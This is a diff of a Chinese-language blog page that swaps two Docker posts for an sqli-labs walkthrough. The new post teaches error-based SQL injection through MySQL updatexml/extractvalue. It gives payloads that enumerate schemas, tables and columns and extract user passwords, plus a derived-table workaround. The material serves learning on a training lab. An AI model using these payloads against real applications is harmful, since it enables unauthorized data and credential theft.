@@ -199,7 +199,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://froming.github.io/2021/06/24/docker%E5%9C%A8linux%E4%B8%8A%E7%9A%84%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E7%9A%84%E5%8E%9F%E7%90%86%E5%AF%B9ubuntu%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%BA%E5%88%B6%E7%9A%84%E7%90%86%E8%A7%A3">
+    <link itemprop="mainEntityOfPage" href="https://froming.github.io/2021/06/24/superforming%E7%9A%84sql-labs%E5%A4%A7%E9%80%9A%E5%85%B3%E4%B9%8B%E7%AC%AC3%E9%83%A8%E5%88%86%E7%89%B9%E6%AE%8A%E5%85%B3%E5%8D%A1%E8%A7%A3%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -212,7 +212,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/06/24/docker%E5%9C%A8linux%E4%B8%8A%E7%9A%84%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E7%9A%84%E5%8E%9F%E7%90%86%E5%AF%B9ubuntu%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%BA%E5%88%B6%E7%9A%84%E7%90%86%E8%A7%A3" class="post-title-link" itemprop="url">docker在linux上的安装以及的原理对ubuntu结构和机制的理解</a>
+          <a href="/2021/06/24/superforming%E7%9A%84sql-labs%E5%A4%A7%E9%80%9A%E5%85%B3%E4%B9%8B%E7%AC%AC3%E9%83%A8%E5%88%86%E7%89%B9%E6%AE%8A%E5%85%B3%E5%8D%A1%E8%A7%A3%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95" class="post-title-link" itemprop="url">superforming的sql-labs大通关之第3部分特殊关卡解析及注入方法</a>
         </h2>
 
         <div class="post-meta-container">
@@ -224,7 +224,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-06-24 00:23:47 / 修改时间：12:32:32" itemprop="dateCreated datePublished" datetime="2021-06-24T00:23:47+08:00">2021-06-24</time>
+      <time title="创建时间：2021-06-24 00:27:49 / 修改时间：12:33:30" itemprop="dateCreated datePublished" datetime="2021-06-24T00:27:49+08:00">2021-06-24</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/docker/" itemprop="url" rel="index"><span itemprop="name">docker</span></a>
+          <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">靶场笔记</span></a>
         </span>
     </span>
 
@@ -246,141 +246,99 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h6 id="对ubuntu以及对机制的理解"><a href="#对ubuntu以及对机制的理解" class="headerlink" title="对ubuntu以及对机制的理解"></a>对ubuntu以及对机制的理解</h6><p>在一开始的时候，Linux的用户下载了安装包以后没有ubuntu这样的管理系统，ubuntu的诞生就是为了解决这一问题，而apt(advanced packaging tool)就是在这个管理系统中的指令，主要有apt-get、apt-cache、apt等管理包的方法。在linux中的文件包是deb的形式，基于这种形式有一个文件会记录一些可以信任的源地址（/etc/apt/sources.list和/etc/apt/sources.list.b），以方便管理，而在linux上用apt-get update频繁更新的原因也是如此——为了源地址列表的信息是正确且最新的。同时ubuntu为了管理安装包会将安装包的信息保存到安装包列表里，以方便管理，所以为了安装包管理的正确性刷新也是必然的。还有其它操作比如apt-key，这一系列语句是用来管理安装包密钥的。安装包密钥的设立是因为GPG的密钥机制，GPG分公钥和私钥，下载软件必须要有私钥也就是在本地计算机上的密钥。</p>
-<h5 id="apt-get的用法"><a href="#apt-get的用法" class="headerlink" title="apt-get的用法"></a>apt-get的用法</h5><p>1.apt-get upgrade package（用来更新安装包的）<br>2.apt-get dist-upgrade package（更新安装包但是不同于上一个，执行语句时系统会解决依赖关系）<br>3.apt-get install package（下载安装包时使用）<br>4.apt-get remove purge（删除包及配置文件）<br>5.apt-get autoremove package（系统自动删除不用的安装包）<br>6。apt-get update（这句话的意思是更新记录源地址的文件）</p>
-<h5 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h5><blockquote>
-<p>sudo apt-get update</p>
-</blockquote>
-<ul>
-<li>&lt;1&gt;语句的意义：这句话的意思是更新记录源地址的文件，从而保证能顺利下载上安装包。<br><img src="https://img-blog.csdnimg.cn/20210131031924578.png" alt="在这里插入图片描述"></li>
+          <h2 id="提要"><a href="#提要" class="headerlink" title="提要"></a>提要</h2><p>本文中的sql语句不可以直接复制到靶场中注入，因为编辑的时候不一定是用英语符号，直接复制可能不会注入成功。我写这一系列的博客，主要是记录的自己的学习心路，以及给后来者一些引导，所以这一系列是教程系得博客。这也让我不会在前面的关卡说太多注入的东西，毕竟学东西讲究一个循序渐进，所以前面几关注入的更多方法留待聪明的你自己发现。</p>
+<h2 id="lt-1-gt-特殊之处"><a href="#lt-1-gt-特殊之处" class="headerlink" title="&lt;1&gt;特殊之处"></a>&lt;1&gt;特殊之处</h2><h5 id="（1）与之前关卡相比"><a href="#（1）与之前关卡相比" class="headerlink" title="（1）与之前关卡相比"></a>（1）与之前关卡相比</h5><ul>
+<li>1.在前十六关，我只讲了sql-labs基于get数据传输方式的“联合查询”、“布尔盲注”、“时间盲注”、和基于post传输数据方式的“联合查询”、“布尔盲注”、“时间盲注”。这是为了，让屏幕前的你学习sql注入有一个循序渐进的过程，这一关将要使用的“报错注入”，前面的关卡也能使用。下面来分析一下为什么能使用“报错注入”，观察源码就会发现调用了“mysql_erroe函数”与“print_r函数”将报错信息输出，所以可以进行”报错注入”，但是不能进行联合查询，因为没有回显。同时因为用了update，所以也不能进行时间盲注。【如下图】</li>
 </ul>
-<h5 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h5><blockquote>
-<p>sudo apt-get install -y apt-transport-https ca-certificates</p>
-</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2021020802354748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <ul>
-<li>&lt;1&gt;语句意义：这句话的意思是导入CA证书使linux可以接受https的文件，参数是y意思是在接下的程序默认选yes（CA中心为每个使用公开密钥的用户发放一个数字证书，数字证书的作用是证明证书中列出的用户合法拥有证书中列出的公开密钥。CA机构的数字签名使得攻击者不能伪造和篡改证书。在SET交易中，CA不仅对持卡人、商户发放证书，还要对获款的银行、网关发放证书。）<br><img src="https://img-blog.csdnimg.cn/20210131032226140.png" alt="在这里插入图片描述"></li>
+<li>2.同时也首次调用”check_input()函数”对变量“uname”进行过滤。【如下图】</li>
 </ul>
-<h5 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h5><blockquote>
-<p>sudo apt-get install dirmngr</p>
-</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210208023309436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="（2）与之后关卡相比"><a href="#（2）与之后关卡相比" class="headerlink" title="（2）与之后关卡相比"></a>（2）与之后关卡相比</h5><p>这一关源码首次调用了“update”这可以更新数据库数据，所以在完成通过以后为了不影响以后的关卡要进行相应操作，或者在操作时不要改成奇奇怪怪的“password”。<br><img src="https://img-blog.csdnimg.cn/20210208024130986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="lt-2-gt-报错查询原理"><a href="#lt-2-gt-报错查询原理" class="headerlink" title="&lt;2&gt;报错查询原理"></a>&lt;2&gt;报错查询原理</h2><h5 id="（1）extractvalue函数"><a href="#（1）extractvalue函数" class="headerlink" title="（1）extractvalue函数"></a>（1）extractvalue函数</h5><ul>
+<li>1.函数作用：这一个函数的作用是返回对应路径下的内容。</li>
+<li>2.语法机构：extractvalue(xml_document,xpath_string)</li>
+<li>3.解释：xml_document就是xml文档的名字，xpath_string就是文档中的路径，且要符合xpath语法</li>
+<li>4.报错原理：当应该输入路径的地方没有遵循xpath语法就会报错，如果网站会将数据库的报错返回到网页上，那我们就可以基于这一点爆取信息，这就是报错注入。</li>
+</ul>
+<h5 id="（2）updatexml函数"><a href="#（2）updatexml函数" class="headerlink" title="（2）updatexml函数"></a>（2）updatexml函数</h5><ul>
+<li>1.函数作用：将对应路径下的值变为新值。</li>
+<li>2.语法结构：updatexml(xml_document,xpath_string,new_value)</li>
+<li>3.解释：前两个参数和之前的函数一样，最后的参数是一个常量是要被赋予的新值。</li>
+<li>4.报错原理：当应该输入路径的地方没有遵循xpath语法就会报错，如果网站会将数据库的报错返回到网页上，那我们就可以基于这一点爆取信息，这就是报错注入。</li>
+</ul>
+<h2 id="lt-3-gt-具体步骤"><a href="#lt-3-gt-具体步骤" class="headerlink" title="&lt;3&gt;具体步骤"></a>&lt;3&gt;具体步骤</h2><h5 id="1-第一步：判断是否存在注入"><a href="#1-第一步：判断是否存在注入" class="headerlink" title="(1)第一步：判断是否存在注入"></a>(1)第一步：判断是否存在注入</h5><p>和前几关基于post数据传输的步骤类似，在“username”和“password”中分别尝试数据包裹的常用的七种方式（“无包裹”、“单引号”、“双引号”、“单引号加单括号”、“双引号加单括号”、“单引号加双括号”、“双引号加双括号”），判断是否有注入。</p>
 <ul>
-<li>&lt;1&gt;语句的意义：dirmngr – 证书列表管理工具(certification lists management tool)。和gnupg一起工作。<br><img src="https://img-blog.csdnimg.cn/20210131034246694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+<li>1.在”username“处进行注入最终发现尝试完七种包裹方式还是不能注入成功，只能得到如下图的结果，证明应该将输入的信息进行了过滤。<br><img src="https://img-blog.csdnimg.cn/20210208031203234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
 </ul>
-<h5 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h5><blockquote>
-<p>sudo apt-key adv –keyserver hkp://p80.pool.sks-keyservers.net:80<br>–recv-keys 58118E89F3A912897C070ADBF76221572C52609</p>
-</blockquote>
 <ul>
-<li>&lt;1&gt;导入密钥，导入的密钥被保存在一个叫trusted的文件里<br><img src="https://img-blog.csdnimg.cn/2021013103460391.png" alt="在这里插入图片描述"></li>
+<li>2.在“password”处进行注入发现，包裹方式为“单引号”。</li>
 </ul>
-<h5 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h5><blockquote>
-<p>sudo echo ‘deb <a target="_blank" rel="noopener" href="https://apt.dockerproject.org/repo">https://apt.dockerproject.org/repo</a> debian-stretch main’ &gt; /etc/apt/sources.list.d/docker.list</p>
-</blockquote>
-<ul>
-<li>&lt;1&gt;语句意义：将前面的那句话导入到docker.list文件中<br><img src="https://img-blog.csdnimg.cn/20210131034802692.png" alt="在这里插入图片描述"></li>
-</ul>
-<h5 id="第六步："><a href="#第六步：" class="headerlink" title="第六步："></a>第六步：</h5><blockquote>
-<p>sudo apt-get update</p>
-</blockquote>
-<ul>
-<li>&lt;1&gt;语句意义：不赘述<br><img src="https://img-blog.csdnimg.cn/20210131035137982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
-</ul>
-<h5 id="第七步："><a href="#第七步：" class="headerlink" title="第七步："></a>第七步：</h5><blockquote>
-<p>sudo apt-get install docker-ce</p>
-</blockquote>
-<p>其实docker的运载有很多，除这一个外还有docker-engine，如果上述语句不行的话再输入：</p>
+<h5 id="2-第二步：爆库名"><a href="#2-第二步：爆库名" class="headerlink" title="(2)第二步：爆库名"></a>(2)第二步：爆库名</h5><p>进行了上文的分析，我们已经知道这一关要基于“报错查询”进行注入，并且只能在“password”处进行注入，所以我们在”username”处输入:</p>
 <blockquote>
-<p>sudo apt-get install docker-engine</p>
+<p>admin</p>
 </blockquote>
-<p>还不行的话要根据回显合理调整<br><img src="https://img-blog.csdnimg.cn/20210131035431449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h5 id="第八步："><a href="#第八步：" class="headerlink" title="第八步："></a>第八步：</h5><blockquote>
-<p>分别输入service docker start和docker version</p>
+<p>在”password”处输入:</p>
+<blockquote>
+<p>admin’ and updatexml(‘forming is very handsome’,concat(‘,’,(select schema_name from information_schema.schemata limit <strong>x</strong>,1),’,’),’forming is very handsome’) #</p>
 </blockquote>
-<p>显示如下图一样则说明，安装成功<br><img src="https://img-blog.csdnimg.cn/2021013103564394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://froming.github.io/2021/06/24/docker%E6%84%8F%E4%B9%89%E4%B8%8E%E7%BB%84%E6%88%90%E5%8F%8A%E5%8E%9F%E7%90%86%E8%BF%98%E6%9C%89%E5%92%8C%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AF%B9%E6%AF%94">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Forming">
-      <meta itemprop="description" content="网络安全websecurity">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A fifth century">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/06/24/docker%E6%84%8F%E4%B9%89%E4%B8%8E%E7%BB%84%E6%88%90%E5%8F%8A%E5%8E%9F%E7%90%86%E8%BF%98%E6%9C%89%E5%92%8C%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AF%B9%E6%AF%94" class="post-title-link" itemprop="url">docker意义与组成及原理还有和虚拟化技术的对比</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-06-24 00:22:59 / 修改时间：12:32:20" itemprop="dateCreated datePublished" datetime="2021-06-24T00:22:59+08:00">2021-06-24</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/docker/" itemprop="url" rel="index"><span itemprop="name">docker</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="docker的意义"><a href="#docker的意义" class="headerlink" title="docker的意义"></a>docker的意义</h2><ul>
-<li>&lt;1&gt;简说<br><strong>总的来说docker让数据传输更容易，同时让程序的运行不是很依赖环境，从而达到节约计算机资源的目的。</strong></li>
-<li>&lt;2&gt;细说<br>当你看到这些优点时，可能理解了docker存在的意义，但是又引出了新问题——怎么理解这些优点，或者说这些优点的具体体现是什么？让我们以一个程序开发者的身份看这些问题。如果你是一个软件的开发者，开发出了一款软件以后需要考虑什么？要考虑软件在不同系统上的适配问题。就像Java环境分linux版、mac版和windows版一样，不同环境软件不一样。这导致软件开发过程中，开发人员不止要考虑程序本身，还要考虑运行问题。这会增加开发人员的工作量，同时在人文上使“运维”和“开发”掰扯不清楚，导致“开发没问题，运行有问题”，让责任不明确。而docker的发明使开发者的工作量更小，同时解决了责任不明的问题。</li>
+<p>或者</p>
+<blockquote>
+<p>admin’ and extractvalue(‘forming is very handsome’,concat(‘,’,(select schema_name from information_schema.schemata limit <strong>x</strong>,1),’,’)) #</p>
+</blockquote>
+<p><strong>特别要注意的是“password”处的“x”是“可变的整数”，意思就是开始数字为0，报完一个数据库的名字之后加一爆下一个的数据库名，这是因为mysql_erroe函数一次的返回只能返回一行数据，不然会报出如下图所示的错误</strong><br><img src="https://img-blog.csdnimg.cn/20210208033629793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入正确以后会返回如下的网页（以x为零做例子）<br><img src="https://img-blog.csdnimg.cn/20210208033817243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="3-第三步：爆表名"><a href="#3-第三步：爆表名" class="headerlink" title="(3)第三步：爆表名"></a>(3)第三步：爆表名</h5><p>和上面第二部类似，只需要改动几处。我们要在“username”处输入：</p>
+<blockquote>
+<p>admin</p>
+</blockquote>
+<p>在“password”处输入：</p>
+<blockquote>
+<p>admin’and updatexml(‘forming is very handsome’,concat(‘,’,(select table_name from information_schema.tables where table_schema=’security’ limit <strong>x</strong>,1),’,’),’forming is very handsome’) #</p>
+</blockquote>
+<p>或者</p>
+<blockquote>
+<p>admin’and extractvalue(‘forming is very handsome’,concat(‘,’,(select table_name from information_schema.tables where table_schema=’security’ limit <strong>x</strong>,1),’,’)) #</p>
+</blockquote>
+<p><strong>特别要注意的是“password”处的“x”是“可变的整数”，意思就是开始数字为0，报完一个数据库的名字之后加一爆下一个的数据库名，这是因为mysql_erroe函数一次的返回只能返回一行数据，不然会报出如下图所示的错误</strong><br>以”x”为0为例输入正确会有如下结果<br><img src="https://img-blog.csdnimg.cn/20210208034837123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="4-第四步：爆字段名"><a href="#4-第四步：爆字段名" class="headerlink" title="(4)第四步：爆字段名"></a>(4)第四步：爆字段名</h5><p>在“username”处输入：</p>
+<blockquote>
+<p>admin</p>
+</blockquote>
+<p>在“password”处输入：</p>
+<blockquote>
+<p>admin’and updatexml(‘forming is very handsome’,concat(‘,’,(select column_name from information_schema.columns where table_name=’users’ limit <strong>x</strong>,1),’,’),’forming is very handsome’)#</p>
+</blockquote>
+<p>或者</p>
+<blockquote>
+<p>admin’and extractvalue(‘forming is very handsome’,concat(‘,’,(select column_name from information_schema.columns where table_name=’users’ limit <strong>x</strong>,1),’,’))#</p>
+</blockquote>
+<p><strong>特别要注意的是“password”处的“x”是“可变的整数”，意思就是开始数字为0，报完一个数据库的名字之后加一爆下一个的数据库名，这是因为mysql_erroe函数一次的返回只能返回一行数据，不然会报出如下图所示的错误</strong><br>以”x”为0为例输入正确会有如下结果</p>
+<p><img src="https://img-blog.csdnimg.cn/20210208035503314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="5-第五步：爆字段"><a href="#5-第五步：爆字段" class="headerlink" title="(5)第五步：爆字段"></a>(5)第五步：爆字段</h5><h6 id="对“You-can’t-specify-target-table-‘users’-for-update-in-FROM-clause”和“Every-derived-table-must-have-its-own-alias”报错的解决及原理"><a href="#对“You-can’t-specify-target-table-‘users’-for-update-in-FROM-clause”和“Every-derived-table-must-have-its-own-alias”报错的解决及原理" class="headerlink" title="对“You can’t specify target table ‘users’ for update in FROM clause”和“Every derived table must have its own alias”报错的解决及原理"></a>对“You can’t specify target table ‘users’ for update in FROM clause”和“Every derived table must have its own alias”报错的解决及原理</h6><ul>
+<li><p>【1】：原理<br>爆字段和前面那几步有根本的不同，首先就是通过网页post传递数据之后经过php脚本在数据库中查信息，在slect一个表的情况下，不能指定该表中的明确的目标进行更改。<strong>如果按照上面和我之前的博文进行举一反三的话会有如下报错</strong><br><img src="https://img-blog.csdnimg.cn/20210208040838551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而我们用“创建表”的方法解决以后会因为这个表没有别名“alias”而有如下报错<br><img src="https://img-blog.csdnimg.cn/20210208041718612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+<li><p>【2】：解决办法<br>既然没办法在select一个表的情况下，update一个表，那我们只需要先执行一个select在这一个基础上select这个select结果，就可以解决第一个问题。同时用”as”的方式解决第二个报错的问题</p>
+</li>
 </ul>
-<h2 id="docker的组成"><a href="#docker的组成" class="headerlink" title="docker的组成"></a>docker的组成</h2><p>docker可以理解为一个程序</p>
+<h6 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h6><ul>
+<li>【1】在“username”处输入：</li>
+</ul>
+<blockquote>
+<p>admin</p>
+</blockquote>
 <ul>
-<li>&lt;1&gt;组成一：镜像<br>既然docker是一个程序，那必然有存储的地方，在理解docker镜像时可以把镜像理解为磁盘文件，值得一提的是镜像本身有自己的分层结构。<a target="_blank" rel="noopener" href="https://blog.csdn.net/kevin_tech/article/details/104453918/?ops_request_misc=&request_id=&biz_id=102&utm_term=docker%25E7%259A%2584%25E9%2595%259C%25E5%2583%258F%25E5%258E%259F%25E7%2590%2586&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-104453918.pc_search_result_no_baidu_js">了解更多镜像知识</a></li>
-<li>&lt;2&gt;组成二：容器<br>有文件就要有在内存上运行的地方，容器就可以理解为一个或多个在内存上的进程。</li>
-<li>&lt;3&gt;组成三：仓库<br>所谓仓库就是储存镜像的地方，最大的公共镜像仓库就是Docker hub</li>
+<li>【2】<strong>在这里用“password”做比，查“username”请读者举一反三</strong><br>在“password”处输入：</li>
 </ul>
-<h2 id="docker的原理"><a href="#docker的原理" class="headerlink" title="docker的原理"></a>docker的原理</h2><p>docker要实现的话要依赖，linux namespace、linux cgroup等，他们分别实现镜像和容器的隔离，和计算机资源的合理运用。这里只做浅谈，想要了解的朋友请自行搜索。</p>
-<h2 id="docker与虚拟机的对比"><a href="#docker与虚拟机的对比" class="headerlink" title="docker与虚拟机的对比"></a>docker与虚拟机的对比</h2><p>拿虚拟机来说，要实现虚拟机要在硬件层(hardsware layer)之上要通过虚拟化软件(hypervisor)形成虚拟层(vitualization)并分化出不同区域，搭建出不同的系统(host os)，同时在虚拟层之上还有管理不同区域的工具——那VMware来说就是VMware workstation。docker则不必这么麻烦，因为他和实体计算机公用一套内核，所以占用资源较少。由此也可以发现，docker相比于虚拟机它与操作系统的联系更紧密。</p>
+<blockquote>
+<p>admin’and updatexml(‘forming is very handsome’,concat(‘,’,(select password from ((select password from users) as formingisveryhandsome) limit <strong>x</strong>,1),’,’),’forming is very handsome’)#</p>
+</blockquote>
+<p>或者</p>
+<blockquote>
+<p>admin’and extractvalue(‘forming is very handsome’,concat(‘,’,(select password from((select password from users)as formingisveryhandsome) limit <strong>x</strong>,1),’,’))#</p>
+</blockquote>
+<p><strong>特别要注意的是“password”处的“x”是“可变的整数”，意思就是开始数字为0，报完一个数据库的名字之后加一爆下一个的数据库名，这是因为mysql_erroe函数一次的返回只能返回一行数据，不然会报出如下图所示的错误</strong><br>就可以实现注入sql语句查询密码。以<strong>x</strong>为<strong>0</strong>为例若输入正确会得到如下图所示的结果：<br><img src="https://img-blog.csdnimg.cn/20210208043332664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="第六步：数据库还原"><a href="#第六步：数据库还原" class="headerlink" title="第六步：数据库还原"></a>第六步：数据库还原</h5><p>这一关特殊之处在于用“update”对数据库中的数据进行改变，所以我们在做完这一关之后要进行还原，还原的方法就是，回到网站的首页<br><img src="https://img-blog.csdnimg.cn/20210208043621896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">点击左上角出如上图的“Setup/reset Database for labs”就可以重置数据库</p>
 
       
     </div>
@@ -400,7 +358,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
